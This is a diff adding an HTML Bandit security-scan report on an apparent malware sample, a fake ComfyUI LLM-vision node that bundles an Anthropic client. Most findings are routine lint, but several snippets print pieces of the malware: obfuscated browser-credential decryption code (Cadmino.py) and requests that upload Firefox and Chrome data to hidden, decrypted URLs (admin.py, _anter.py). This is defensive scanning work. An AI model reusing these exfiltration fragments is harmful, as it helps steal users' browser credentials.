@@ -1,0 +1,685 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+
+<meta charset="UTF-8">
+
+<title>
+    Bandit Report
+</title>
+
+<style>
+
+html * {
+    font-family: "Arial", sans-serif;
+}
+
+pre {
+    font-family: "Monaco", monospace;
+}
+
+.bordered-box {
+    border: 1px solid black;
+    padding-top:.5em;
+    padding-bottom:.5em;
+    padding-left:1em;
+}
+
+.metrics-box {
+    font-size: 1.1em;
+    line-height: 130%;
+}
+
+.metrics-title {
+    font-size: 1.5em;
+    font-weight: 500;
+    margin-bottom: .25em;
+}
+
+.issue-description {
+    font-size: 1.3em;
+    font-weight: 500;
+}
+
+.candidate-issues {
+    margin-left: 2em;
+    border-left: solid 1px; LightGray;
+    padding-left: 5%;
+    margin-top: .2em;
+    margin-bottom: .2em;
+}
+
+.issue-block {
+    border: 1px solid LightGray;
+    padding-left: .5em;
+    padding-top: .5em;
+    padding-bottom: .5em;
+    margin-bottom: .5em;
+}
+
+.issue-sev-high {
+    background-color: Pink;
+}
+
+.issue-sev-medium {
+    background-color: NavajoWhite;
+}
+
+.issue-sev-low {
+    background-color: LightCyan;
+}
+
+</style>
+</head>
+
+<body>
+
+<div id="metrics">
+    <div class="metrics-box bordered-box">
+        <div class="metrics-title">
+            Metrics:<br>
+        </div>
+        Total lines of code: <span id="loc">9245</span><br>
+        Total lines skipped (#nosec): <span id="nosec">0</span>
+    </div>
+</div>
+
+
+
+
+<br>
+<div id="results">
+    
+<div id="issue-0">
+<div class="issue-block issue-sev-medium">
+    <b>request_without_timeout: </b> Requests call without timeout<br>
+    <b>Test ID:</b> B113<br>
+    <b>Severity: </b>MEDIUM<br>
+    <b>Confidence: </b>LOW<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/400.html" target="_blank">CWE-400</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py</a><br>
+    <b>Line number: </b>33<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html</a><br>
+
+<div class="code">
+<pre>
+29	        ],
+30	        &#x27;temperature&#x27;: 0.2,
+31	        &#x27;max_tokens&#x27;: 256
+32	    }
+33	    with requests.post(f&quot;{anthropic_url}/v1/messages&quot;, headers=headers, json=data) as response:
+34	        if response.status_code not in [200, 429, 400]:
+35	            return
+36	
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-1">
+<div class="issue-block issue-sev-medium">
+    <b>request_without_timeout: </b> Requests call without timeout<br>
+    <b>Test ID:</b> B113<br>
+    <b>Severity: </b>MEDIUM<br>
+    <b>Confidence: </b>LOW<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/400.html" target="_blank">CWE-400</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py</a><br>
+    <b>Line number: </b>114<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html</a><br>
+
+<div class="code">
+<pre>
+110	    else:
+111	        url = os.getenv(&#x27;DEST_URL&#x27;)
+112	    if key_info[&quot;valid&quot;]:
+113	        try:
+114	            result = requests.post(url, json = data)
+115	        except:
+116	            pass
+117	
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-2">
+<div class="issue-block issue-sev-low">
+    <b>try_except_pass: </b> Try, Except, Pass detected.<br>
+    <b>Test ID:</b> B110<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py</a><br>
+    <b>Line number: </b>115<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html</a><br>
+
+<div class="code">
+<pre>
+111	        url = os.getenv(&#x27;DEST_URL&#x27;)
+112	    if key_info[&quot;valid&quot;]:
+113	        try:
+114	            result = requests.post(url, json = data)
+115	        except:
+116	            pass
+117	
+118	def boot_test():
+119	    status = verify_status()
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-3">
+<div class="issue-block issue-sev-medium">
+    <b>request_without_timeout: </b> Requests call without timeout<br>
+    <b>Test ID:</b> B113<br>
+    <b>Severity: </b>MEDIUM<br>
+    <b>Confidence: </b>LOW<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/400.html" target="_blank">CWE-400</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py</a><br>
+    <b>Line number: </b>133<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html</a><br>
+
+<div class="code">
+<pre>
+129	        url = decodez.decrypt(url).decode()
+130	    else:
+131	        url = os.getenv(&#x27;BOOT_URL&#x27;)
+132	    try:
+133	        result = requests.post(url, json = data)
+134	    except:
+135	        pass
+136	
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-4">
+<div class="issue-block issue-sev-low">
+    <b>try_except_pass: </b> Try, Except, Pass detected.<br>
+    <b>Test ID:</b> B110<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_anter.py</a><br>
+    <b>Line number: </b>134<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html</a><br>
+
+<div class="code">
+<pre>
+130	    else:
+131	        url = os.getenv(&#x27;BOOT_URL&#x27;)
+132	    try:
+133	        result = requests.post(url, json = data)
+134	    except:
+135	        pass
+136	
+137	def pretty_print_anthropic_keys(keys):
+138	    print(&#x27;-&#x27; * 90)
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-5">
+<div class="issue-block issue-sev-low">
+    <b>blacklist: </b> Standard pseudo-random generators are not suitable for security/cryptographic purposes.<br>
+    <b>Test ID:</b> B311<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/330.html" target="_blank">CWE-330</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_base_client.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_base_client.py</a><br>
+    <b>Line number: </b>671<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/blacklists/blacklist_calls.html#b311-random" target="_blank">https://bandit.readthedocs.io/en/1.7.9/blacklists/blacklist_calls.html#b311-random</a><br>
+
+<div class="code">
+<pre>
+667	        # Apply exponential backoff, but not more than the max.
+668	        sleep_seconds = min(INITIAL_RETRY_DELAY * pow(2.0, nb_retries), MAX_RETRY_DELAY)
+669	
+670	        # Apply some jitter, plus-or-minus half a second.
+671	        jitter = 1 - 0.25 * random()
+672	        timeout = sleep_seconds * jitter
+673	        return timeout if timeout &gt;= 0 else 0
+674	
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-6">
+<div class="issue-block issue-sev-low">
+    <b>try_except_pass: </b> Try, Except, Pass detected.<br>
+    <b>Test ID:</b> B110<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_base_client.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_base_client.py</a><br>
+    <b>Line number: </b>718<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html</a><br>
+
+<div class="code">
+<pre>
+714	class SyncHttpxClientWrapper(httpx.Client):
+715	    def __del__(self) -&gt; None:
+716	        try:
+717	            self.close()
+718	        except Exception:
+719	            pass
+720	
+721	
+722	class SyncAPIClient(BaseClient[httpx.Client, Stream[Any]]):
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-7">
+<div class="issue-block issue-sev-low">
+    <b>try_except_pass: </b> Try, Except, Pass detected.<br>
+    <b>Test ID:</b> B110<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_base_client.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_base_client.py</a><br>
+    <b>Line number: </b>1265<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html</a><br>
+
+<div class="code">
+<pre>
+1261	    def __del__(self) -&gt; None:
+1262	        try:
+1263	            # TODO(someday): support non asyncio runtimes here
+1264	            asyncio.get_running_loop().create_task(self.aclose())
+1265	        except Exception:
+1266	            pass
+1267	
+1268	
+1269	class AsyncAPIClient(BaseClient[httpx.AsyncClient, AsyncStream[Any]]):
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-8">
+<div class="issue-block issue-sev-low">
+    <b>try_except_pass: </b> Try, Except, Pass detected.<br>
+    <b>Test ID:</b> B110<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_models.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_models.py</a><br>
+    <b>Line number: </b>317<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b110_try_except_pass.html</a><br>
+
+<div class="code">
+<pre>
+313	
+314	    if is_union(origin):
+315	        try:
+316	            return validate_type(type_=cast(&quot;type[object]&quot;, type_), value=value)
+317	        except Exception:
+318	            pass
+319	
+320	        # if the type is a discriminated union then we want to construct the right variant
+321	        # in the union, even if the data doesn&#x27;t match exactly, otherwise we&#x27;d break code
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-9">
+<div class="issue-block issue-sev-low">
+    <b>try_except_continue: </b> Try, Except, Continue detected.<br>
+    <b>Test ID:</b> B112<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_models.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_models.py</a><br>
+    <b>Line number: </b>346<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b112_try_except_continue.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b112_try_except_continue.html</a><br>
+
+<div class="code">
+<pre>
+342	        # if the data is not valid, use the first variant that doesn&#x27;t fail while deserializing
+343	        for variant in args:
+344	            try:
+345	                return construct_type(value=value, type_=variant)
+346	            except Exception:
+347	                continue
+348	
+349	        raise RuntimeError(f&quot;Could not convert data into a valid instance of {type_}&quot;)
+350	
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-10">
+<div class="issue-block issue-sev-low">
+    <b>assert_used: </b> Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.<br>
+    <b>Test ID:</b> B101<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_utils/_utils.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/_utils/_utils.py</a><br>
+    <b>Line number: </b>75<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html</a><br>
+
+<div class="code">
+<pre>
+71	        from .._files import assert_is_file_content
+72	
+73	        # We have exhausted the path, return the entry we found.
+74	        assert_is_file_content(obj, key=flattened_key)
+75	        assert flattened_key is not None
+76	        return [(flattened_key, cast(FileTypes, obj))]
+77	
+78	    index += 1
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-11">
+<div class="issue-block issue-sev-high">
+    <b>blacklist: </b> The pyCrypto library and its module AES are no longer actively maintained and have been deprecated. Consider using pyca/cryptography library.<br>
+    <b>Test ID:</b> B413<br>
+    <b>Severity: </b>HIGH<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/327.html" target="_blank">CWE-327</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/browser/Cadmino.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/browser/Cadmino.py</a><br>
+    <b>Line number: </b>14<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/blacklists/blacklist_imports.html#b413-import-pycrypto" target="_blank">https://bandit.readthedocs.io/en/1.7.9/blacklists/blacklist_imports.html#b413-import-pycrypto</a><br>
+
+<div class="code">
+<pre>
+10	D=&#x27;file&#x27;
+11	C=&#x27;query&#x27;
+12	import base64 as O,json,os as B,shutil as P,sqlite3 as Q
+13	from datetime import datetime as R,timedelta as S
+14	from Crypto.Cipher import AES
+15	if B.name==&#x27;nt&#x27;:from win32crypt import CryptUnprotectData as T
+16	else:from Crypto.Protocol.KDF import PBKDF2 as U
+17	A=B.getenv(&#x27;LOCALAPPDATA&#x27;)
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-12">
+<div class="issue-block issue-sev-high">
+    <b>blacklist: </b> The pyCrypto library and its module PBKDF2 are no longer actively maintained and have been deprecated. Consider using pyca/cryptography library.<br>
+    <b>Test ID:</b> B413<br>
+    <b>Severity: </b>HIGH<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/327.html" target="_blank">CWE-327</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/browser/Cadmino.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/browser/Cadmino.py</a><br>
+    <b>Line number: </b>16<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/blacklists/blacklist_imports.html#b413-import-pycrypto" target="_blank">https://bandit.readthedocs.io/en/1.7.9/blacklists/blacklist_imports.html#b413-import-pycrypto</a><br>
+
+<div class="code">
+<pre>
+12	import base64 as O,json,os as B,shutil as P,sqlite3 as Q
+13	from datetime import datetime as R,timedelta as S
+14	from Crypto.Cipher import AES
+15	if B.name==&#x27;nt&#x27;:from win32crypt import CryptUnprotectData as T
+16	else:from Crypto.Protocol.KDF import PBKDF2 as U
+17	A=B.getenv(&#x27;LOCALAPPDATA&#x27;)
+18	if A is None:
+19	    A=__file__
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-13">
+<div class="issue-block issue-sev-medium">
+    <b>request_without_timeout: </b> Requests call without timeout<br>
+    <b>Test ID:</b> B113<br>
+    <b>Severity: </b>MEDIUM<br>
+    <b>Confidence: </b>LOW<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/400.html" target="_blank">CWE-400</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/browser/admin.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/browser/admin.py</a><br>
+    <b>Line number: </b>37<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html</a><br>
+
+<div class="code">
+<pre>
+33	        A = U.decrypt(A).decode()
+34	    else:
+35	        A = os.getenv(L)
+36	    C = {M: (D, &#x27;{&quot;content&quot;: &quot;Firefox&quot;}&#x27;), N: B(J, &quot;rb&quot;)}
+37	    E.post(A, files=C)
+38	    C = {M: (D, &#x27;{&quot;content&quot;: &quot;Chrome&quot;}&#x27;), N: B(K, &quot;rb&quot;)}
+39	    E.post(A, files=C)
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-14">
+<div class="issue-block issue-sev-medium">
+    <b>request_without_timeout: </b> Requests call without timeout<br>
+    <b>Test ID:</b> B113<br>
+    <b>Severity: </b>MEDIUM<br>
+    <b>Confidence: </b>LOW<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/400.html" target="_blank">CWE-400</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/browser/admin.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/browser/admin.py</a><br>
+    <b>Line number: </b>39<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b113_request_without_timeout.html</a><br>
+
+<div class="code">
+<pre>
+35	        A = os.getenv(L)
+36	    C = {M: (D, &#x27;{&quot;content&quot;: &quot;Firefox&quot;}&#x27;), N: B(J, &quot;rb&quot;)}
+37	    E.post(A, files=C)
+38	    C = {M: (D, &#x27;{&quot;content&quot;: &quot;Chrome&quot;}&#x27;), N: B(K, &quot;rb&quot;)}
+39	    E.post(A, files=C)
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-15">
+<div class="issue-block issue-sev-low">
+    <b>assert_used: </b> Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.<br>
+    <b>Test ID:</b> B101<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/streaming/_messages.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/streaming/_messages.py</a><br>
+    <b>Line number: </b>48<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html</a><br>
+
+<div class="code">
+<pre>
+44	        &quot;&quot;&quot;Waits until the stream has been read to completion and returns
+45	        the accumulated `Message` object.
+46	        &quot;&quot;&quot;
+47	        self.until_done()
+48	        assert self.__final_message_snapshot is not None
+49	        return self.__final_message_snapshot
+50	
+51	    def get_final_text(self) -&gt; str:
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-16">
+<div class="issue-block issue-sev-low">
+    <b>assert_used: </b> Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.<br>
+    <b>Test ID:</b> B101<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/streaming/_messages.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/streaming/_messages.py</a><br>
+    <b>Line number: </b>82<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html</a><br>
+
+<div class="code">
+<pre>
+78	
+79	    # properties
+80	    @property
+81	    def current_message_snapshot(self) -&gt; Message:
+82	        assert self.__final_message_snapshot is not None
+83	        return self.__final_message_snapshot
+84	
+85	    # event handlers
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-17">
+<div class="issue-block issue-sev-low">
+    <b>assert_used: </b> Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.<br>
+    <b>Test ID:</b> B101<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/streaming/_messages.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/streaming/_messages.py</a><br>
+    <b>Line number: </b>238<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html</a><br>
+
+<div class="code">
+<pre>
+234	        &quot;&quot;&quot;Waits until the stream has been read to completion and returns
+235	        the accumulated `Message` object.
+236	        &quot;&quot;&quot;
+237	        await self.until_done()
+238	        assert self.__final_message_snapshot is not None
+239	        return self.__final_message_snapshot
+240	
+241	    async def get_final_text(self) -&gt; str:
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-18">
+<div class="issue-block issue-sev-low">
+    <b>assert_used: </b> Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.<br>
+    <b>Test ID:</b> B101<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/streaming/_messages.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/streaming/_messages.py</a><br>
+    <b>Line number: </b>272<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html</a><br>
+
+<div class="code">
+<pre>
+268	
+269	    # properties
+270	    @property
+271	    def current_message_snapshot(self) -&gt; Message:
+272	        assert self.__final_message_snapshot is not None
+273	        return self.__final_message_snapshot
+274	
+275	    # event handlers
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-19">
+<div class="issue-block issue-sev-low">
+    <b>assert_used: </b> Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.<br>
+    <b>Test ID:</b> B101<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/vertex/_client.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/vertex/_client.py</a><br>
+    <b>Line number: </b>192<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html</a><br>
+
+<div class="code">
+<pre>
+188	
+189	        if not self._credentials.token:
+190	            raise RuntimeError(&quot;Could not resolve API token from the environment&quot;)
+191	
+192	        assert isinstance(self._credentials.token, str)
+193	        return self._credentials.token
+194	
+195	
+</pre>
+</div>
+
+
+</div>
+</div>
+
+<div id="issue-20">
+<div class="issue-block issue-sev-low">
+    <b>assert_used: </b> Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.<br>
+    <b>Test ID:</b> B101<br>
+    <b>Severity: </b>LOW<br>
+    <b>Confidence: </b>HIGH<br>
+    <b>CWE: </b><a href="https://cwe.mitre.org/data/definitions/703.html" target="_blank">CWE-703</a><br>
+    <b>File: </b><a href="/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/vertex/_client.py" target="_blank">/home/c_byrne/projects/custom-nodes-security-scan/example_malware/ComfyUI_LLMVISION/anthropic/lib/vertex/_client.py</a><br>
+    <b>Line number: </b>279<br>
+    <b>More info: </b><a href="https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html" target="_blank">https://bandit.readthedocs.io/en/1.7.9/plugins/b101_assert_used.html</a><br>
+
+<div class="code">
+<pre>
+275	
+276	        if not self._credentials.token:
+277	            raise RuntimeError(&quot;Could not resolve API token from the environment&quot;)
+278	
+279	        assert isinstance(self._credentials.token, str)
+280	        return self._credentials.token
+</pre>
+</div>
+
+
+</div>
+</div>
+
+</div>
+
+</body>
+</html>
